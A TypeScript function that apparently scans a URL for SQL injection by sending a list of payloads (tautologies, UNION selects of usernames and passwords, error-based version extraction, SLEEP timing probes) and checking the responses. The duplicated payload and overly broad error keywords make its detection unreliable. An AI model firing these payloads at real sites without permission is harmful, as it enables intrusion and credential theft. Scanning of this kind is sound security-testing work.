import axios from 'axios';

const PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' UNION SELECT NULL, NULL, NULL -- ",
    "' UNION SELECT username, password FROM users -- ",
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    "' OR 1=1 -- ",
    "' OR 1=2 -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT VERSION()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- ",
    "' OR IF(1=1, SLEEP(5), 0) -- ",
    "' OR IF(1=2, SLEEP(5), 0) -- ",
    "' OR '1'='1' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' OR '1'='1' AND 1=CONVERT(int, (SELECT @@version)) -- "
];

export async function isSqlInjection(url: string): Promise<{ vulnerable: boolean, responseTime: number }> {
    for (const payload of PAYLOADS) {
        try {
            const start = Date.now();
            const { data } = await axios.get(`${url}${encodeURIComponent(payload)}`);
            const responseTime = Date.now() - start;

            const sqlErrors = [
                'syntax error',
                'warning',
                'error',
                'unknown column',
                'mysql',
                'sql',
                'database',
                'version'
            ];

            if (sqlErrors.some(error => data.toLowerCase().includes(error))) {
                console.log(`Potential SQL Injection vulnerability found with payload: ${payload}`);
                return { vulnerable: true, responseTime };
            }

            if (responseTime > 3000) {
                console.log(`Potential time-based SQL Injection vulnerability detected with payload: ${payload}`);
                return { vulnerable: true, responseTime };
            }
        } catch (error) {
            console.error(`Error testing SQL Injection on ${url}:`, error);
        }
    }
    return { vulnerable: false, responseTime: 0 };
}
